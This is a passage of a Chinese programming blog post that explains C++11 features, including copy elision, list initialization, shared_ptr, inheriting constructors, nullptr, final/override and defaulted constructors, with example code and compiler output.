class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Point</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> __x;</span><br><span class="line">    <span class="type">int</span> __y;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Point</span>(<span class="type">int</span> _x = <span class="number">0</span>, <span class="type">int</span> _y = <span class="number">0</span>) : __x(_x), __y(_y)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;constructor called&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">Point</span>(<span class="type">const</span> Point &amp;point)</span><br><span class="line">    &#123;</span><br><span class="line">        __x = point.__x;</span><br><span class="line">        __y = point.__y;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;copy constructor called&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">static</span> Point <span class="title">Origin</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;generating origin point...&quot;</span>&lt;&lt;endl;</span><br><span class="line">        <span class="function">Point <span class="title">origin</span><span class="params">(<span class="number">1</span>,<span class="number">1</span>)</span></span>;</span><br><span class="line">        cout&lt;&lt;hex&lt;&lt;&amp;origin&lt;&lt;endl;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;origin point generated!&quot;</span>&lt;&lt;endl;</span><br><span class="line">        <span class="keyword">return</span> origin;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">x</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> __x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">y</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> __y;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Point O=Point::<span class="built_in">Origin</span>();</span><br><span class="line">    cout&lt;&lt;&amp;O&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>主函数里定义了一个Point O,按照之前的认识,<code>Point O=Point::Origin();</code>这句话应该是这样执行的:</p>
+<p>首先调用<code>Point::Origin()</code>,这个函数中会调用构造函数</p>
+<p>接着<code>Point O=返回值</code>这里要对O调用拷贝构造函数</p>
+<p>总共有两次调用构造函数,然而实际上只调用了一次</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\86135\Desktop\cpp&gt; g++ -std=c++11 main.cpp  -O0 -o main </span><br><span class="line">PS C:\Users\86135\Desktop\cpp&gt; ./main</span><br><span class="line">generating origin point...</span><br><span class="line">constructor called</span><br><span class="line">0x60fe88</span><br><span class="line">origin point generated!</span><br><span class="line">0x60fe88</span><br></pre></td></tr></table></figure>
+
+<p>从两次地址的打印来看,两个对象实际上是一个对象,因此Origin函数可以认为返回的是这个对象的指针,从反汇编看确实如此</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">main中:</span><br><span class="line">lea     eax, [ebp+var_10]</span><br><span class="line">mov     [esp], eax      ; this</span><br><span class="line">call    __ZN5Point6OriginEv ; Point::Origin(void)</span><br><span class="line">lea     eax, [ebp+var_10]</span><br><span class="line">mov     ecx, eax</span><br><span class="line">Point::Origin中:</span><br><span class="line">mov     dword ptr [esp+4], 1 ; int</span><br><span class="line">mov     dword ptr [esp], 1 ; this</span><br><span class="line">mov     ecx, [ebp+this]</span><br><span class="line">call    __ZN5PointC1Eii ; Point::Point(int,int)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<h2 id="列表初始化"><a href="#列表初始化" class="headerlink" title="列表初始化"></a>列表初始化</h2><p>在写词法分析器的时候有这么一个符号类</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Token</span></span><br><span class="line">&#123;</span><br><span class="line">    TokenType type;</span><br><span class="line">    std::string lexme;</span><br><span class="line">    <span class="type">double</span> value;</span><br><span class="line">    Func func;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Token</span>(TokenType t = ERRORTOKEN, std::string l = <span class="string">&quot;&quot;</span>, <span class="type">double</span> v = <span class="number">0.0</span>, Func f = <span class="literal">NULL</span>) : <span class="built_in">type</span>(t),</span><br><span class="line">                                                                                         <span class="built_in">lexme</span>(l),</span><br><span class="line">                                                                                         <span class="built_in">value</span>(v),</span><br><span class="line">                                                                                         <span class="built_in">func</span>(f)</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">///...其他成员函数</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>现在需要建立一个内建符号表,如果使用老式的写法</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;Token&gt; built_in_token_table=&#123;</span><br><span class="line">	<span class="built_in">Token</span>(CONST_ID,<span class="string">&quot;PI&quot;</span>,<span class="number">3.1415926</span>,<span class="literal">NULL</span>),</span><br><span class="line">	<span class="built_in">Token</span>(CONST_ID,<span class="string">&quot;E&quot;</span>,<span class="number">2.71828</span>,<span class="literal">NULL</span>),</span><br><span class="line">	...</span><br><span class="line">	<span class="built_in">Token</span>(DRAW,<span class="string">&quot;DRAW&quot;</span>,<span class="number">0.0</span>,<span class="literal">NULL</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>每个条目都要显式调用构造函数<code>Token(...)</code></p>
+<p>而如果使用初始化列表</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;Token&gt; build_in_token_table = &#123;</span><br><span class="line">    &#123;CONST_ID, <span class="string">&quot;PI&quot;</span>, <span class="number">3.1415926</span>, <span class="literal">NULL</span>&#125;,</span><br><span class="line">    &#123;CONST_ID, <span class="string">&quot;E&quot;</span>, <span class="number">2.71828</span>, <span class="literal">NULL</span>&#125;,</span><br><span class="line">	...</span><br><span class="line">    &#123;DRAW, <span class="string">&quot;DRAW&quot;</span>, <span class="number">0.0</span>, <span class="literal">NULL</span>&#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>这样效果和上面一模一样,也会调用构造函数,但是不用写<code>Token(...)</code>,实际上也是调用相应参数个数的构造函数</p>
+<h2 id="Lambda表达式"><a href="#Lambda表达式" class="headerlink" title="Lambda表达式"></a>Lambda表达式</h2><p>在实验室电脑上,开学乎上</p>
+<h2 id="智能指针"><a href="#智能指针" class="headerlink" title="智能指针"></a>智能指针</h2><p>之前C++和C的堆内存管理责任全在程序员,new了不delete会内存泄漏,new了delete两次会造成二次释放漏洞.</p>
+<p>而有些对象到底啥时候释放,可能人也把握不准,比如这次编译原理实验中,词法分析器的getToken函数总是返回一个Token*指针,函数内部会在堆上开一块内存放对象</p>
+<p>然而parser在使用完了这个Token之后没有立刻释放,因为我也不知道啥时候一个Token才会真正使用完,比如一个T类型的Token,它作为变量可能会存在一段时间,提前析构了后来就会访问非法内存</p>
+<p>于是Token几乎都存在内存泄漏,而我也不知道咋处理</p>
+<p>智能指针就解决了这个困扰</p>
+<p>智能指针实际上是对普通指针的包装,但是他会对对象有一个引用计数</p>
+<p>每当有一个智能指针指向同一块内存的时候,引用计数就会加一,当一个智能指针消亡或者不再指向该内存的时候,引用计数减一,最后一个不再指向该内存的智能指针会发现引用计数从1到0,于是它会自动析构这个对象</p>
+<p>显然就不用人操心在啥时候释放对象了</p>
+<p>到底咋用呢?写一个链表类意思意思</p>
+<p>关键词:<code>make_shared,shared_ptr</code></p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;memory&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">LinkedNode</span>&#123;</span><br><span class="line">    <span class="type">int</span> __key;</span><br><span class="line">    shared_ptr&lt;LinkedNode&gt; __next;</span><br><span class="line">    <span class="built_in">LinkedNode</span>(<span class="type">int</span> _key=<span class="number">0</span>,shared_ptr&lt;LinkedNode&gt; _next=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">        __key=_key;</span><br><span class="line">        __next=_next;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;LinkedNode ctor called&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    ~<span class="built_in">LinkedNode</span>()&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;LinkedNode dtor called&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">shared_ptr&lt;LinkedNode&gt; <span class="title">getNext</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> __next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getKey</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> __key;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">setNext</span><span class="params">(shared_ptr&lt;LinkedNode&gt; _next)</span></span>&#123;</span><br><span class="line">        __next=_next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">setKey</span><span class="params">(<span class="type">int</span> _key)</span></span>&#123;</span><br><span class="line">        __key=_key;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">string <span class="title">toString</span><span class="params">()</span><span class="type">const</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">to_string</span>(__key);</span><br><span class="line">    &#125;</span><br><span class="line">    LinkedNode <span class="keyword">operator</span>=(<span class="type">const</span> LinkedNode &amp;)=<span class="keyword">delete</span>;</span><br><span class="line">    <span class="built_in">LinkedNode</span>(<span class="type">const</span> LinkedNode&amp;)=<span class="keyword">delete</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LinkedList</span>&#123;</span><br><span class="line">    shared_ptr&lt;LinkedNode&gt; head;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">LinkedList</span>()&#123;</span><br><span class="line">        head=<span class="built_in">make_shared</span>&lt;LinkedNode&gt;(<span class="number">0</span>,<span class="literal">nullptr</span>);<span class="comment">//注意创建节点不再直接调用构造函数</span></span><br><span class="line">        <span class="comment">//使用make_shared&lt;类名&gt;(参数)创建对象,返回值用shared_ptr&lt;类名&gt;类型承载</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">pushHead</span><span class="params">(<span class="type">const</span> <span class="type">int</span> &amp;key)</span></span>&#123;</span><br><span class="line">        <span class="keyword">auto</span> node=<span class="built_in">make_shared</span>&lt;LinkedNode&gt;(key,head-&gt;<span class="built_in">getNext</span>());</span><br><span class="line">        head-&gt;<span class="built_in">setNext</span>(node);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">popHead</span><span class="params">()</span></span>&#123;</span><br><span class="line">        head-&gt;<span class="built_in">setNext</span>(head-&gt;<span class="built_in">getNext</span>()-&gt;<span class="built_in">getNext</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">empty</span><span class="params">()</span><span class="type">const</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nullptr</span>==head-&gt;<span class="built_in">getNext</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">string <span class="title">toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">auto</span> p=head-&gt;<span class="built_in">getNext</span>();</span><br><span class="line">        string buffer;</span><br><span class="line">        <span class="keyword">while</span>(p!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">            buffer+=p-&gt;<span class="built_in">toString</span>()+<span class="string">&quot;  &quot;</span>;</span><br><span class="line">            p=p-&gt;<span class="built_in">getNext</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> buffer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LinkedList list;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">        list.<span class="built_in">pushHead</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;list.<span class="built_in">toString</span>()&lt;&lt;endl;</span><br><span class="line">    list.<span class="built_in">popHead</span>();</span><br><span class="line">    cout&lt;&lt;list.<span class="built_in">toString</span>()&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\86135\Desktop\cpp&gt; g++ -std=c++11 main.cpp -O0 -o main</span><br><span class="line">PS C:\Users\86135\Desktop\cpp&gt; ./main</span><br><span class="line">LinkedNode ctor called</span><br><span class="line">LinkedNode ctor called</span><br><span class="line">LinkedNode ctor called</span><br><span class="line">LinkedNode ctor called</span><br><span class="line">LinkedNode ctor called</span><br><span class="line">LinkedNode ctor called</span><br><span class="line">LinkedNode ctor called</span><br><span class="line">LinkedNode ctor called</span><br><span class="line">LinkedNode ctor called</span><br><span class="line">LinkedNode ctor called</span><br><span class="line">LinkedNode ctor called</span><br><span class="line">9  8  7  6  5  4  3  2  1  0</span><br><span class="line">LinkedNode dtor called</span><br><span class="line">8  7  6  5  4  3  2  1  0</span><br><span class="line">LinkedNode dtor called</span><br><span class="line">LinkedNode dtor called</span><br><span class="line">LinkedNode dtor called</span><br><span class="line">LinkedNode dtor called</span><br><span class="line">LinkedNode dtor called</span><br><span class="line">LinkedNode dtor called</span><br><span class="line">LinkedNode dtor called</span><br><span class="line">LinkedNode dtor called</span><br><span class="line">LinkedNode dtor called</span><br><span class="line">LinkedNode dtor called</span><br></pre></td></tr></table></figure>
+
+<p>没有任何手动delete的地方,但是dtor依然被调用了</p>
+<p><code>shared_ptr&lt;LinkedNode&gt;</code>和<code>LinkedNode *</code>,在用法上一模一样,都是使用箭头调用成员函数</p>
+<p>但是<code>shared_ptr&lt;LinkedNode&gt;</code>实际上封装了一个<code>LinkedNode *</code>,前者还有其他功能</p>
+<p>比如</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">auto</span> node=<span class="built_in">make_shared</span>&lt;LinkedNode&gt;(<span class="number">0</span>,<span class="literal">nullptr</span>);</span><br><span class="line">cout&lt;&lt;hex&lt;&lt;node&lt;&lt;<span class="string">&quot;  &quot;</span>&lt;&lt;node.<span class="built_in">get</span>()&lt;&lt;endl;<span class="comment">//get返回裸指针LinkedNode*</span></span><br></pre></td></tr></table></figure>
+
+<p>node可以使用点号调用shared_ptr类的成员函数,使用箭头符号调用的是其托管对象类的成员函数</p>
+<h2 id="继承构造函数"><a href="#继承构造函数" class="headerlink" title="继承构造函数"></a>继承构造函数</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Point</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> __x;</span><br><span class="line">    <span class="type">int</span> __y;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Point</span>(<span class="type">int</span> _x , <span class="type">int</span> _y ) :</span><br><span class="line">        __x(_x), __y(_y)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;constructor called&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">x</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> __x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">y</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> __y;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">string <span class="title">toString</span><span class="params">()</span><span class="type">const</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;(&quot;</span>+<span class="built_in">to_string</span>(__x)+<span class="string">&quot;,&quot;</span>+<span class="built_in">to_string</span>(__y)+<span class="string">&quot;)&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TaggedPoint</span>:<span class="keyword">public</span> Point&#123;</span><br><span class="line">    string __tag;</span><br><span class="line">    <span class="keyword">using</span> Point::Point;<span class="comment">//继承父类所有构造函数</span></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">TaggedPoint</span>(<span class="type">int</span> _x,<span class="type">int</span> _y,string _tag):<span class="built_in">TaggedPoint</span>(_x,_y)&#123;<span class="comment">//委托构造函数,也是c++11特性</span></span><br><span class="line">        __tag=_tag;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">string <span class="title">toString</span><span class="params">()</span><span class="type">const</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> __tag+Point::<span class="built_in">toString</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">TaggedPoint <span class="title">A</span><span class="params">(<span class="number">1</span>,<span class="number">2</span>)</span></span>;<span class="comment">//TaggedPoint本没有两个int的构造函数,但是其父类有</span></span><br><span class="line">    cout&lt;&lt;A.<span class="built_in">toString</span>()&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="nullptr"><a href="#nullptr" class="headerlink" title="nullptr"></a>nullptr</h2><p>之前表示空指针都使用NULL,而实际上这是个int 0</p>
+<p>c++11之后表示空指针的常量是nullptr</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(<span class="type">void</span> *ptr)</span></span>&#123;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;ptr func called&quot;</span>&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(<span class="type">int</span> value)</span></span>&#123;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;value func called&quot;</span>&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">func</span>(<span class="literal">nullptr</span>);</span><br><span class="line">    <span class="built_in">func</span>(<span class="literal">NULL</span>);<span class="comment">//二义性警告,两个重载函数都是次完美匹配,</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\86135\Desktop\cpp&gt; g++ -std=c++11 main.cpp  -O0 -o main </span><br><span class="line">main.cpp: In <span class="keyword">function</span> <span class="string">&#x27;int main()&#x27;</span>:</span><br><span class="line">main.cpp:57:14: warning: passing NULL to non-pointer argument 1 of <span class="string">&#x27;void func(int)&#x27;</span> [-Wconversion-null]</span><br><span class="line">     func(NULL);</span><br><span class="line">              ^</span><br><span class="line">PS C:\Users\86135\Desktop\cpp&gt; ./main</span><br><span class="line">ptr func called</span><br><span class="line">value func called</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="final关键字"><a href="#final关键字" class="headerlink" title="final关键字"></a>final关键字</h2><p>final修饰的类不允许被继承,不允许虚函数重载</p>
+<h2 id="override关键字"><a href="#override关键字" class="headerlink" title="override关键字"></a>override关键字</h2><p>override关键字修饰子类成员函数,保证是在重写父类同名函数,否则报错</p>
+<h2 id="default构造函数"><a href="#default构造函数" class="headerlink" title="default构造函数"></a>default构造函数</h2><p>在之前的c++中,如果一个类没有显式写构造函数,那么编译器会自动加上一个无参的隐式构造函数,这个构造函数几乎啥也不干(在汇编层面上会哦用子类虚表覆盖父类虚表,算是干了点东西,但是源代码层面无法体现)</p>
+<p>假如显示定义了一个带参数的构造函数,则编译器不会再隐式添加无参构造函数,这时候就不能无参构造了</p>
+<p>比如这样就会报编译错:</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Point</span>&#123;</span><br><span class="line">    <span class="type">int</span> __x;</span><br><span class="line">    <span class="type">int</span> __y;</span><br><span class="line">    <span class="built_in">Point</span>(<span class="type">int</span> _x,<span class="type">int</span> _y):__x(_x),__y(_y)&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;ctor called&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Point A;<span class="comment">//尝试调用缺省或者无参构造函数失败</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>解决方法是另写一个无参的构造函数</p>
+<p>在c++11中的解决方法是<code>Point()=default;</code></p>
